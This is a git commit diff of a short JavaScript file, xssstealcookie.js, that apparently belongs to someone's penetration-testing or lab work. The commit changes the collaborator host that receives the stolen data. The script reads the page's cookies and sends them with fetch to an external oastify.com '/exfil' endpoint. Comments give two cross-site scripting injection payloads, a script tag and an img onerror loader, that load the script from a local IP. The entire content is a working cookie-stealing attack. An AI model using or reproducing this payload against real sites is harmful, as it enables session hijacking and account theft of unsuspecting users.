f2f4e7eec8dbeedc59b40ccbc2bc5baa14823eac
tmohakr <119854114+tmohakr@users.noreply.github.com>
2024-02-28 15:02:19 +0000

    Update xssstealcookie.js

--- xssstealcookie.js
+++ xssstealcookie.js
@@ -1,6 +1,9 @@
 let cookie=document.cookie
 let encodedCookie=encodeURIComponent(cookie)
-fetch ("http://fcv7ef1el1bkfhf2nwxz2v3srjxal19q.oastify.com/exfil?data=" + encodedCookie)
+fetch ("http://9gqa8nr9zgdmp3xqodu35upx8oef25qu.oastify.com/exfil?data=" + encodedCookie)
+
+
+
 //thisworks with <script src="http://192.168.45.233/xssstealcookie.js" ></script>
 //or
 //<img src/onerror=s=document.createElement('script');s.src='http://192.168.45.233/xssstealcookies.js';document.body.appendChild(s)>
